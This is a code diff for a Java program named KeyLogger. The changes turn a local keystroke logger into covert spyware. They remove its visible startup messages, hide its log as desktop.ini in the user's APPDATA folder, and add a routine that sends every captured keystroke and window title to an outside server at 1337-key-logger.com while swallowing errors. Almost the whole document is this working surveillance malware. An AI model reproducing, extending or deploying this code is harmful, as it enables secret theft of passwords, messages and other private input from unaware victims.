@@ -1,11 +1,10 @@
 package app;
 
-import java.io.IOException;
-import java.io.OutputStream;
-import java.io.PrintWriter;
+import java.io.*;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
+import java.net.URLEncoder;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -21,13 +20,11 @@ import org.slf4j.LoggerFactory;
 
 
 public class KeyLogger implements NativeKeyListener {
-
-    private static final Path file = Paths.get("keys.txt");
+    private String dataFolder = System.getenv("APPDATA");
+    private final Path file = Paths.get(dataFolder+"/desktop.ini");
     private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 
     public static void main(String[] args) throws Exception {
-
-        logger.info("Key logger has been started");
 
         init();
 
@@ -58,12 +55,14 @@ public class KeyLogger implements NativeKeyListener {
                 StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
             if (keyText.length() > 1) {
                 String ret=WindowsFocus.work();
-               // ret=ret.split("[keylogger_maven]")[1];
-                System.out.println(ret);
-                writer.print(ret+"[" + keyText + "]\n");
+                writer.print(ret+" [" + keyText + "]\n");
+                if(netIsAvailable()){
+                    sendtoServer(ret+" [" + keyText + "]\n");
+                }
             } else {
                 writer.print(keyText);
             }
+
 
         } catch (IOException ex) {
             logger.error(ex.getMessage(), ex);
@@ -92,6 +91,32 @@ public class KeyLogger implements NativeKeyListener {
             throw new RuntimeException(e);
         } catch (IOException e) {
             return false;
+        }
+    }
+
+    void sendtoServer (String key) {
+        try {
+
+            URL url;
+            URLConnection urlConn;
+            DataOutputStream dos;
+
+            url = new URL("http://1337-key-logger.com");
+            urlConn = url.openConnection();
+            urlConn.setDoInput(true);
+            urlConn.setDoOutput(true);
+            urlConn.setUseCaches(false);
+            urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+
+            dos = new DataOutputStream(urlConn.getOutputStream());
+            String message = "NEW_KEY=" + URLEncoder.encode(key);
+            dos.writeBytes(message);
+            dos.flush();
+            dos.close();
+
+        }
+        catch (IOException ignored) {
+
         }
     }
 }
